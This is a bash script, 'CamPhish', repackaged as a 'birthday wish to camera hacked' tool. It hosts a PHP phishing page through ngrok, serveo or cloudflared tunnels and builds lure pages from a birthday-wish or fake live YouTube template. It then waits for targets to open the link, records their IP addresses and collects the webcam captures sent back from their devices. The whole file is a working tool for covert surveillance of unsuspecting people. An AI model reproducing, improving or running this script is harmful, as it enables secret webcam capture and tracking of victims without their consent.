#!/bin/bash
# CamPhish For HBD
# Powered by Hat-Abm
# Credits goes to thelinuxchoice [github.com/BD8KR3M/]

trap 'printf "\n";stop' 2

banner() {
clear  
printf "\e[\n" 
printf "\e[92m        █████╗  █████╗ ███╗   ███╗██████╗\e[0m\n" 
printf "\e[92m       ██╔══██╗██╔══██╗████╗ ████║██╔══██╗\e[0m\n"
printf "\e[92m       ██║  ╚═╝███████║██╔████╔██║██████╔╝\e[0m\n"
printf "\e[91m       ██║  ██╗██╔══██║██║╚██╔╝██║██╔═══╝\e[0m\n"
printf "\e[91m       ╚█████╔╝██║  ██║██║ ╚═╝ ██║██║     \e[0m\n"
printf "\e[91m        ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     \e[0m\n"
printf " \e[1;77m         HAT-ABM | Github.com/BD8KR3M \e[0m \n"
printf " \e[1;77m            MOD BY- |ABM MUJAHID| \e[0m \n"
printf "       \e[1;45m♦-BIRTHDAY WISH TO CAMERA HACKED-♦\e[0m \n"
printf " \e[1;77m---------------------------------------------\e[0m \n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
    
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    
    if [[ $checkcloudflared == *'cloudflared'* ]]; then
        killall -2 cloudflared > /dev/null 2>&1
    fi
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;91m[\e[0m+\e[1;91m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;96m[\e[0m+\e[1;96m] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done 
}

server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:8080 serveo.net  2> /dev/null > sendlink ' &
        sleep 8
    else
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 serveo.net 2> /dev/null > sendlink ' &
        sleep 8
    fi
    
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:8080)\e[0m\n"
    fuser -k 8080/tcp > /dev/null 2>&1
    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 3
    
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
}

# Cloudflared Installation Function
install_cloudflared() {
    if [[ -e "cloudflared" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared already installed.\n"
    else
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
        arch=$(uname -m)
        
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
        else
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
        fi
        
        chmod +x cloudflared
        printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared installed successfully!\n"
    fi
}

# Cloudflared Server Function
cloudflared_server() {
    install_cloudflared
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 8080...\n"
    fuser -k 8080/tcp > /dev/null 2>&1
    php -S localhost:8080 > /dev/null 2>&1 &
    sleep 2
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
    ./cloudflared tunnel --url http://localhost:8080 > .cloudflared.log 2>&1 &
    sleep 10
    
    # Get Cloudflared URL
    cloudflared_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cloudflared.log)
    
    if [[ ! -z "$cloudflared_url" ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared Direct link:\e[0m\e[1;77m %s\e[0m\n" $cloudflared_url
        # Update the template with cloudflared URL
        sed 's+forwarding_link+'$cloudflared_url'+g' template.php > index.php
        if [[ $option_tem -eq 1 ]]; then
            sed 's+forwarding_link+'$cloudflared_url'+g' festivalwishes.html > index3.html
            sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
        else
            sed 's+forwarding_link+'$cloudflared_url'+g' LiveYTTV.html > index3.html
            sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
        fi
        rm -rf index3.html
    else
        printf "\e[1;93m[!] Failed to get Cloudflared URL. Check .cloudflared.log for details.\n"
        exit 1
    fi
    
    checkfound
}

payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    fi
    rm -rf index3.html
}

select_template() {
    if [ $option_server -gt 3 ] || [ $option_server -lt 1 ]; then
        printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
        sleep 1
        clear
        banner
        camphish
    else
        printf "\n-----Choose a template----\n"    
        printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m H B D Wishing\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
        default_option_template="1"
        read -p $'\n\e[1;96m[\e[0m\e[1;77m+\e[0m\e[1;96m] Choose a template: [Default is 1] \e[0m' option_tem
        option_tem="${option_tem:-${default_option_template}}"
        
        if [[ $option_tem -eq 1 ]]; then
            read -p $'\n\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m] Just Enter \e[0m' fest_name
            fest_name="${fest_name//[[:space:]]/}"
        elif [[ $option_tem -eq 2 ]]; then
            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
        else
            printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
            sleep 1
            select_template
        fi
    fi
}

ngrok_server() {
    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi
        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!] Download error... \e[0m\n"
                exit 1
            fi
        fi
    fi

    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on port 8080...\n"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
    sleep 2
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 8080 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

    payload_ngrok
    checkfound
}

camphish() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi

    printf "\n⭕ Choose tunnel server👇👇\n"    
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflared  [Default]\e[0m\n"
    
    default_option_server="3"
    read -p $'\n\e[1;96m[\e[0m\e[1;77m+\e[0m\e[1;96m] Choose a Option: [Default is 3] \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    
    select_template
    
    if [[ $option_server -eq 2 ]]; then
        command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
        start
    elif [[ $option_server -eq 1 ]]; then
        ngrok_server
    elif [[ $option_server -eq 3 ]]; then
        cloudflared_server
    else
        printf "\e[1;93m [!] Invalid option!\e[0m\n"
        sleep 1
        clear
        camphish
    fi
}

payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    fi
    rm -rf index3.html
}

start() {
    default_choose_sub="Y"
    default_subdomain="saycheese$RANDOM"

    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
    read choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        subdomain_resp=true
        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
        read subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    fi

    server
    payload
    checkfound
}

banner
dependencies
camphish
